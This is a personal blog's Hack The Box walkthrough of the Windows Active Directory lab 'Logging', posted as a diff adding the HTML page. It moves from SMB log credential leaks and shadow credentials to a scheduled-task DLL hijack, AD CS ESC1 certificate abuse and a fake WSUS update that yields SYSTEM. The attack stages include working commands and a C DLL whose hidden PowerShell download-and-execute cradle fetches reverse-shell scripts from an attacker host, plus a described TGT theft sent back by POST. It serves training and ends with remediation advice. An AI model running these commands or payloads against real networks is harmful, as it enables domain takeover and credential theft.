@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Seed creds into SMB log disclosure, shadow credentials pivot, scheduled-task DLL hijack, AD CS ESC1 cert for a fake WSUS endpoint, and a poisoned update to SYSTEM on the DC.">
+<title>HTB Logging · Will DeDominico</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>(function(){try{var s=localStorage.getItem('theme');var l=window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches;document.documentElement.setAttribute('data-theme', s||(l?'light':'dark'));}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
+</head>
+<body class="wp-body">
+<div class="grain" aria-hidden="true"></div>
+<header class="nav">
+  <div class="nav-left">
+    <a href="../index.html" class="nav-logo"><span class="nav-mark">W</span><span class="nav-name">Will</span><span class="nav-surname">DeDominico</span></a>
+    <button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme">
+      <span class="theme-sun" aria-hidden="true">☀</span>
+      <span class="theme-moon" aria-hidden="true">☾</span>
+    </button>
+  </div>
+  <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links"><span class="sr-only">Menu</span><span></span><span></span><span></span></button>
+  <nav id="nav-links" class="nav-links">
+    <a href="../index.html" class="">HOME</a>
+    <a href="../writeups/index.html" class="is-active">WRITEUPS</a>
+    <a href="../projects/index.html" class="">PROJECTS</a>
+    <a href="https://github.com/Moriz82" class="ext" target="_blank" rel="noopener">GITHUB <span class="ext-arrow">↗</span></a>
+    <a href="https://github.com/Moriz82/Resume/blob/main/Resume.pdf" class="ext" target="_blank" rel="noopener">RESUME <span class="ext-arrow">↗</span></a>
+    <a href="../about.html" class="">ABOUT</a>
+    <a href="../contact.html" class="">CONTACT</a>
+  </nav>
+</header>
+
+<div class="wp-stripe wp-stripe-top">
+  <div class="wp-stripe-inner">
+    <span class="wp-crumb"><span class="l">OPS.LOG</span> / <span>HTB</span> / <span class="cur">HTB-LOGGING</span></span>
+    <span class="wp-crumb-r">ENG#09 &middot; CLASSIFIED-WHITE &middot; DECLASSIFIED 26.04.19</span>
+  </div>
+</div>
+
+<main class="wp-main">
+
+  <section class="wp-hero">
+    <div class="wp-hero-left card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="wp-hero-row">
+        <div class="wp-hero-logo cat-htb">
+          <img src="../assets/img/writeups/htb-logging.png" alt="HTB Logging" class="wp-hero-avatar">
+        </div>
+        <div class="wp-hero-text">
+          <div class="wp-chips">
+            <span class="wp-chip diff-medium">MEDIUM</span>
+            <span class="wp-chip wp-chip-os os-windows">WINDOWS</span>
+            <span class="wp-chip wp-chip-ghost tag-cycle-0">AD</span><span class="wp-chip wp-chip-ghost tag-cycle-1">SMB</span><span class="wp-chip wp-chip-ghost tag-cycle-2">SHADOW-CREDS</span><span class="wp-chip wp-chip-ghost tag-cycle-3">DLL-HIJACK</span><span class="wp-chip wp-chip-ghost tag-cycle-4">ADCS</span><span class="wp-chip wp-chip-ghost tag-cycle-5">WSUS</span>
+            <span class="wp-chip wp-chip-pts">30 PTS</span>
+          </div>
+          <h1 class="wp-title">HTB Logging<span class="wp-title-mark">&mdash;</span></h1>
+          <p class="wp-summary">Seed creds into SMB log disclosure, shadow credentials pivot, scheduled-task DLL hijack, AD CS ESC1 cert for a fake WSUS endpoint, and a poisoned update to SYSTEM on the DC.</p>
+        </div>
+      </div>
+    </div>
+
+    <aside class="wp-meta-card card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="card-head"><span class="l"># ENGAGEMENT META</span></div>
+      <hr class="dashed">
+      <dl class="wp-meta-list">
+        <div><dt>PLATFORM</dt><dd>Hack The Box</dd></div>
+        <div><dt>TARGET</dt><dd>logging.htb</dd></div>
+        <div><dt>REF</dt><dd>10.129.22.14</dd></div>
+        <div><dt>START</dt><dd>01:15 EDT</dd></div>
+        
+        <div><dt>DURATION</dt><dd>14 min read</dd></div>
+        <div><dt>OPERATOR</dt><dd>WDD-01</dd></div>
+      </dl>
+    </aside>
+  </section>
+
+  <section class="wp-killchain card static">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <div class="wp-killchain-head">
+      <span class="l"># KILL CHAIN &middot; 5 STAGES</span>
+      <span class="r">OUTCOME: <span class="hl-ok">SYSTEM</span></span>
+    </div>
+    <hr class="dashed">
+    <div class="wp-killchain-grid">
+      <a class="wp-kc-card kc-warn" href="#recon">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.01</div>
+        <div class="kc-stage">RECON</div>
+        <div class="kc-sub">SMB log disclosure</div>
+        <div class="kc-tag kc-tag-warn">NXC</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#foothold">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.02</div>
+        <div class="kc-stage">FOOTHOLD</div>
+        <div class="kc-sub">shadow creds msa_health$</div>
+        <div class="kc-tag kc-tag-warn">BLOODYAD</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#user">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.03</div>
+        <div class="kc-stage">USER</div>
+        <div class="kc-sub">DLL hijack jaylee</div>
+        <div class="kc-tag kc-tag-warn">MINGW</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#adcs">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.04</div>
+        <div class="kc-stage">ADCS</div>
+        <div class="kc-sub">ESC1 UpdateSrv cert</div>
+        <div class="kc-tag kc-tag-warn">CERTIPY</div>
+      </a>
+      <a class="wp-kc-card kc-ok" href="#system">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.05</div>
+        <div class="kc-stage">SYSTEM</div>
+        <div class="kc-sub">fake WSUS on DC01</div>
+        <div class="kc-tag kc-tag-ok">GOAL</div>
+      </a>
+    </div>
+  </section>
+
+  <div class="wp-grid">
+
+    <aside class="wp-toc">
+      <div class="wp-toc-head"># STAGES</div>
+      <nav>
+        <a href="#recon" class="wp-toc-row" data-stage="01">
+          <span class="n">01</span>
+          <span class="t">RECON</span>
+        </a>
+        <a href="#foothold" class="wp-toc-row" data-stage="02">
+          <span class="n">02</span>
+          <span class="t">FOOTHOLD</span>
+        </a>
+        <a href="#user" class="wp-toc-row" data-stage="03">
+          <span class="n">03</span>
+          <span class="t">USER</span>
+        </a>
+        <a href="#adcs" class="wp-toc-row" data-stage="04">
+          <span class="n">04</span>
+          <span class="t">ADCS</span>
+        </a>
+        <a href="#system" class="wp-toc-row" data-stage="05">
+          <span class="n">05</span>
+          <span class="t">SYSTEM</span>
+        </a>
+      </nav>
+    </aside>
+
+    <article class="wp-article">
+      <section class="wp-stage" id="recon" data-stage="01">
+<div class="wp-stage-lbl"># STG.01 &middot; RECON</div>
+<h2 class="wp-stage-title">Seed creds, a Logs share, and a password stuck in last year.</h2>
+<div class="wp-stage-body"><p>Starting with the seed credentials <span class="hl-red">wallace.everette</span> / <code>Welcome2026@</code>, we validate domain access and enumerate SMB shares.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ netexec smb 10.129.22.14 -u wallace.everette -p &#39;Welcome2026@&#39; --shares
+SMB   10.129.22.14  445  DC01  [+] logging.htb\wallace.everette:Welcome2026@
+SMB   10.129.22.14  445  DC01  Share      Permissions  Remark
+SMB   10.129.22.14  445  DC01  -----      -----------  ------
+SMB   10.129.22.14  445  DC01  ADMIN$                  Remote Admin
+SMB   10.129.22.14  445  DC01  C$                      Default share
+SMB   10.129.22.14  445  DC01  IPC$       READ         Remote IPC
+SMB   10.129.22.14  445  DC01  Logs       READ         Log Files
+SMB   10.129.22.14  445  DC01  NETLOGON   READ         Logon server share
+SMB   10.129.22.14  445  DC01  SYSVOL     READ         Logon server share</code></pre>
+</div>
+The <span class="hl-warn">Logs</span> share stands out as non-default. Listing its contents reveals several log files, with `IdentitySync_Trace_20260219.log` being the interesting one.
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ netexec smb 10.129.22.14 -u wallace.everette -p &#39;Welcome2026@&#39; --share Logs --dir .</code></pre>
+</div>
+Downloading and reading through the identity sync trace, a bind credential sits in plaintext:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># IdentitySync_Trace_20260219.log</span></div>
+<pre class="wp-term-body"><code class="language-bash">BindUser: &quot;LOGGING\svc_recovery&quot;, BindPass: &quot;Em3rg3ncyPa$$2025&quot;</code></pre>
+</div>
+<aside class="wp-callout wp-note"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># YEAR BUMP</div><div class="wp-callout-body"><p>The log is dated 2026 but the password ends in <code>2025</code>. This is a <mark>yearly password rotation pattern</mark> -- bump the year to <code>2026</code> and the credential is live.</p>
+</div></aside>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ netexec smb 10.129.22.14 -u svc_recovery -p &#39;Em3rg3ncyPa$$2026&#39;
+SMB   10.129.22.14  445  DC01  [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026</code></pre>
+</div>
+<span class="hl-ok">Valid</span>. We now have credentials for <span class="hl-red">svc_recovery</span>.</div>
+</section>
+<section class="wp-stage" id="foothold" data-stage="02">
+<div class="wp-stage-lbl"># STG.02 &middot; FOOTHOLD</div>
+<h2 class="wp-stage-title">Shadow credentials on a managed service account nobody was watching.</h2>
+<div class="wp-stage-body"><p>Using <span class="hl-red">svc_recovery</span>, we grab a Kerberos TGT and enumerate writable objects with BloodyAD.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ getTGT.py logging.htb/svc_recovery:&#39;Em3rg3ncyPa$$2026&#39; -dc-ip 10.129.22.14
+[*] Saving ticket in svc_recovery.ccache</code></pre>
+</div>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · bloodyAD</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ bloodyAD -d logging.htb -k ccache=svc_recovery.ccache \
+  -H DC01.logging.htb -i 10.129.22.14 \
+  get writable --otype computer --detail</code></pre>
+</div>
+<span class="hl-red">svc_recovery</span> has write access to the <span class="hl-warn">msDS-KeyCredentialLink</span> attribute on the <span class="hl-red">msa_health$</span> managed service account. This is a textbook shadow credentials attack -- we add our own key pair and authenticate as the account.
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · shadow creds</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ bloodyAD -d logging.htb -k ccache=svc_recovery.ccache \
+  -H DC01.logging.htb -i 10.129.22.14 \
+  add shadowCredentials --path ./loot/msa_health_shadow msa_health$</code></pre>
+</div>
+This yields an NT hash for <span class="hl-red">msa_health$</span>. Confirming WinRM access:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ netexec winrm 10.129.22.14 -u &#39;msa_health$&#39; -H &#39;603fc24ee01a9409f83c9d1d701485c5&#39;
+WINRM  10.129.22.14  5985  DC01  [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5 (Pwn3d!)</code></pre>
+</div>
+<span class="hl-ok">Pwn3d</span>. WinRM shell as <span class="hl-red">msa_health$</span>.</div>
+</section>
+<section class="wp-stage" id="user" data-stage="03">
+<div class="wp-stage-lbl"># STG.03 &middot; USER</div>
+<h2 class="wp-stage-title">A scheduled task, a zip file, and the loader lock that almost ruined everything.</h2>
+<div class="wp-stage-body"><p>Poking around the system reveals a scheduled task called <span class="hl-warn">UpdateChecker Agent</span> that runs every 3 minutes as <span class="hl-red">LOGGING\jaylee.clifton</span>. The task executes <code>C:\Program Files\UpdateMonitor\UpdateMonitor.exe</code>.</p>
+<p>The binary reads a zip from <code>C:\ProgramData\UpdateMonitor\Settings_Update.zip</code>, extracts <code>settings_update.dll</code> to the <code>bin\</code> directory, and loads it via <code>LoadLibrary</code>. It also calls a <code>PreUpdateCheck</code> export from the DLL if it exists.</p>
+<p>The key: <span class="hl-red">msa_health$</span> has <mark>write access</mark> to <code>C:\ProgramData\UpdateMonitor\</code>, so we can drop our own zip containing a malicious DLL.</p>
+<aside class="wp-callout wp-warn"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># LOADER LOCK GOTCHA</div><div class="wp-callout-body"><p>You cannot use a standard msfvenom DLL payload here. Both <code>windows/shell_reverse_tcp</code> and <code>windows/exec</code> will deadlock in <code>DllMain</code> due to the Windows loader lock. Any socket operations or complex process creation from <code>DllMain</code> will hang <code>UpdateMonitor.exe</code>, locking the DLL on disk and preventing future extractions.</p>
+</div></aside>
+The solution is a custom DLL with `mingw` that spawns a child process and returns from `DllMain` immediately:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># dllpayload.c</span></div>
+<pre class="wp-term-body"><code class="language-c">#include &lt;windows.h&gt;
+DWORD WINAPI RunPayload(LPVOID lpParam) {
+    WinExec(&quot;cmd.exe /c start /B powershell -ep bypass -w hidden -c \
+      \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.17.35:8080/rev.ps1&#39;)\&quot;&quot;,
+      SW_HIDE);
+    return 0;
+}
+BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {
+    if (r == DLL_PROCESS_ATTACH) {
+        WinExec(&quot;cmd.exe /c start /B powershell -ep bypass -w hidden -c \
+          \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.17.35:8080/rev.ps1&#39;)\&quot;&quot;,
+          SW_HIDE);
+        Sleep(500);
+    }
+    return TRUE;
+}
+__declspec(dllexport) void PreUpdateCheck(void) { }</code></pre>
+</div>
+<aside class="wp-callout wp-tip"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># TIP</div><div class="wp-callout-body"><p>The <code>PreUpdateCheck</code> export is required -- <code>UpdateMonitor.exe</code> looks for it after loading the DLL. Without it, the binary logs an error and the task fails silently. The <code>Sleep(500)</code> gives the child process time to spawn before the parent exits.</p>
+</div></aside>
+Compile, zip, and drop:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ i686-w64-mingw32-gcc -shared -o settings_update.dll dllpayload.c -lkernel32
+$ zip -j Settings_Update.zip settings_update.dll</code></pre>
+</div>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · msa_health$ · upload</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ netexec winrm 10.129.22.14 -u &#39;msa_health$&#39; -H &#39;&lt;hash&gt;&#39; \
+  -X &quot;Invoke-WebRequest -Uri http://10.10.17.35:8080/Settings_Update.zip \
+  -OutFile C:\ProgramData\UpdateMonitor\Settings_Update.zip&quot;</code></pre>
+</div>
+The `rev.ps1` PowerShell script downloads `Rubeus.exe`, runs `tgtdeleg` to grab jaylee's TGT, and POSTs the results back to our HTTP server before opening an interactive shell. Within 3 minutes, the scheduled task fires, extracts our DLL, loads it, and we get a callback as <span class="hl-red">jaylee.clifton</span>.
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># callback · jaylee.clifton</span></div>
+<pre class="wp-term-body"><code class="language-bash">user=jaylee.clifton host=DC01 exe=True</code></pre>
+</div>
+<aside class="wp-opsec"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-opsec-head"># OPSEC NOTE</div><div class="wp-opsec-body"><p>The <code>tgtdeleg</code> trick via Rubeus is critical here -- it captures the delegated TGT for <span class="hl-red">jaylee.clifton</span> from the scheduled task context. We need this Kerberos ticket for the AD CS enrollment in the next stage.</p>
+</div></aside>
+**User Flag:** `81a3d868fa0aba6cd2b742152127500b`</div>
+</section>
+<section class="wp-stage" id="adcs" data-stage="04">
+<div class="wp-stage-lbl"># STG.04 &middot; ADCS</div>
+<h2 class="wp-stage-title">ESC1 on the UpdateSrv template -- a cert for any hostname you want.</h2>
+<div class="wp-stage-body"><p><span class="hl-red">jaylee.clifton</span> is a member of the <span class="hl-warn">IT</span> group. Running certipy to enumerate AD CS templates:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · certipy</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ certipy find -u wallace.everette@logging.htb -p &#39;Welcome2026@&#39; \
+  -dc-ip 10.129.22.14 -enabled -stdout</code></pre>
+</div>
+A template called <span class="hl-warn">UpdateSrv</span> is enrollable by the `IT` group. It has <mark>Enrollee Supplies Subject</mark> enabled and the <span class="hl-warn">Server Authentication</span> EKU -- a classic <span class="hl-red">ESC1</span> misconfiguration. We can request a certificate for any DNS name.
+
+<p>Using jaylee&#39;s delegated TGT, we request a certificate with the SAN <code>wsus.logging.htb</code>:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · certipy req</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ KRB5CCNAME=loot/jaylee_tgt.ccache certipy req -k -no-pass \
+  -dc-ip 10.129.22.14 -target DC01.logging.htb \
+  -ca logging-DC01-CA -template UpdateSrv \
+  -dns wsus.logging.htb -out loot/wsus/wsus</code></pre>
+</div>
+Convert the PFX to PEM for use with the WSUS server:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ openssl pkcs12 -in loot/wsus/wsus.pfx -nodes -out loot/wsus/wsus.pem -passin pass:</code></pre>
+</div>
+<aside class="wp-callout wp-note"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># WHY ESC1 MATTERS</div><div class="wp-callout-body"><p>Enrollee Supplies Subject means the requester controls the Subject Alternative Name. Combined with Server Authentication EKU, this lets us mint a TLS certificate that Windows Update will trust for any hostname in the domain -- including <code>wsus.logging.htb</code>.</p>
+</div></aside></div>
+</section>
+<section class="wp-stage" id="system" data-stage="05">
+<div class="wp-stage-lbl"># STG.05 &middot; SYSTEM</div>
+<h2 class="wp-stage-title">DNS poisoning, a fake WSUS, and a KB update that runs PsExec.</h2>
+<div class="wp-stage-body"><p>Checking the registry on DC01 reveals WSUS is configured to point to <code>https://wsus.logging.htb:8531</code>. This hostname doesn&#39;t resolve yet -- so we create the DNS record ourselves.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · bloodyAD</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ bloodyAD -d logging.htb -u wallace.everette -p &#39;Welcome2026@&#39; \
+  -H DC01.logging.htb -i 10.129.22.14 \
+  add dnsRecord wsus 10.10.17.35</code></pre>
+</div>
+After the DNS zone polling interval (~90 seconds), the record resolves to our attacker IP:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ dig wsus.logging.htb @10.129.22.8 +short
+10.10.17.35</code></pre>
+</div>
+Now we stand up `wsuks`, a fake WSUS server that serves a malicious update containing `PsExec64.exe` with our payload. The TLS certificate from AD CS matches the `wsus.logging.htb` hostname, so Windows Update trusts our server without complaint.
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · wsuks</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ python -m wsuks.wsuks --serve-only \
+  --WSUS-Server wsus.logging.htb --WSUS-Port 8531 \
+  --tls-cert loot/wsus/wsus.pem -I tun0 \
+  -c &#39;/accepteula /s cmd.exe /c powershell -ep bypass -w hidden -c \
+    &quot;iwr http://10.10.17.35:8080/sys_rev.ps1 -OutFile C:\Windows\Temp\sys_rev.ps1; \
+    powershell -ep bypass -File C:\Windows\Temp\sys_rev.ps1&quot;&#39;</code></pre>
+</div>
+Trigger the update scan from our existing WinRM session:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · msa_health$ · trigger</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ netexec winrm 10.129.22.14 -u &#39;msa_health$&#39; -H &#39;&lt;hash&gt;&#39; \
+  -X &#39;wuauclt /detectnow; Start-Process UsoClient.exe -ArgumentList &quot;StartScan&quot;&#39;</code></pre>
+</div>
+The DC connects to our fake WSUS, downloads `PsExec64.exe` disguised as a KB update, and executes it as <span class="hl-ok">SYSTEM</span> with our payload. After a short wait, the callback arrives:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># callback · NT AUTHORITY\SYSTEM</span></div>
+<pre class="wp-term-body"><code class="language-bash">whoami: nt authority\system
+hostname: DC01</code></pre>
+</div>
+<span class="hl-ok">NT AUTHORITY\SYSTEM</span>. Rooted.
+
+<p><strong>Root Flag:</strong> <code>db62eef9e285c5a597275abe1a76d4a1</code></p>
+</div>
+</section>
+      <nav class="wp-post-nav">
+        <a class="wp-np prev" href="htb-devarea-writeup.html">
+          <span class="l">&larr; ENG#08</span>
+          <span class="t">HTB DEVAREA</span>
+        </a>
+        
+        <span class="wp-np-sig">LAST SIGNAL &middot; 26.04.19</span>
+<span></span>
+      </nav>
+    </article>
+
+    <aside class="wp-side">
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># LOADOUT</div>
+        <hr class="dashed">
+        <div class="wp-loadout">
+          <div class="wp-loadout-row"><span class="tool">nmap</span><span class="purp">recon</span></div>
+          <div class="wp-loadout-row"><span class="tool">netexec</span><span class="purp">auth</span></div>
+          <div class="wp-loadout-row"><span class="tool">impacket</span><span class="purp">ad</span></div>
+          <div class="wp-loadout-row"><span class="tool">bloodyAD</span><span class="purp">shadow-creds</span></div>
+          <div class="wp-loadout-row"><span class="tool">certipy</span><span class="purp">adcs</span></div>
+          <div class="wp-loadout-row"><span class="tool">mingw</span><span class="purp">dll-forge</span></div>
+          <div class="wp-loadout-row"><span class="tool">wsuks</span><span class="purp">wsus-mitm</span></div>
+          <div class="wp-loadout-row"><span class="tool">evil-winrm</span><span class="purp">shell</span></div>
+        </div>
+      </div>
+
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># REMEDIATION</div>
+        <hr class="dashed">
+        <ul class="wp-remediation">
+          <li>Restrict SMB share ACLs on log directories containing credentials</li>
+          <li>Audit msDS-KeyCredentialLink write permissions on managed service accounts</li>
+          <li>Lock down scheduled task binary paths and DLL search order</li>
+          <li>Remove Enrollee Supplies Subject on AD CS templates with Server Authentication EKU</li>
+          <li>Pin WSUS hostname in DNS with static records or DNSSEC</li>
+        </ul>
+      </div>
+    </aside>
+
+  </div>
+
+</main>
+
+<footer class="stats-strip">
+  <a class="stat-card" href="https://app.hackthebox.com/users/666550" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">HTB</span>
+    <span class="stat-value">75 OWNED</span>
+  </a>
+  <a class="stat-card" href="../about.html#ctfs">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">CTFs</span>
+    <span class="stat-value">5 PLAYED</span>
+  </a>
+  <a class="stat-card" href="https://github.com/Moriz82" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">GITHUB</span>
+    <span class="stat-value">@moriz82</span>
+  </a>
+</footer>
+<div class="colophon">
+  <span>// 2026 Will DeDominico · built on markdown</span>
+  <span>2026-08-29 04:24 UTC</span>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/powershell.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/python.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/yaml.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/json.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/swift.min.js" defer></script>
+<script>window.addEventListener('load',function(){if(window.hljs){hljs.configure({ignoreUnescapedHTML:true});document.querySelectorAll('pre code, .wp-term-body code').forEach(function(b){hljs.highlightElement(b);});}});</script>
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
